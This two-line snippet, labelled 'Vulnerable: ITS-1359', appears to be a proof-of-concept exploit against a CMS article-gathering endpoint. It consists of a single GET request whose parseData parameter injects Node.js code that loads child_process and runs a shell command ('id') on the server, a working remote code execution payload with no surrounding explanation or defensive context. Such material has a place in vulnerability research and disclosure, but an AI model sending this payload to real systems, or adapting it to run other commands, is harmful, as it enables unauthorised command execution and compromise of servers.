# Vulnerable: ITS-1359
GET /cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27id%27).toString()
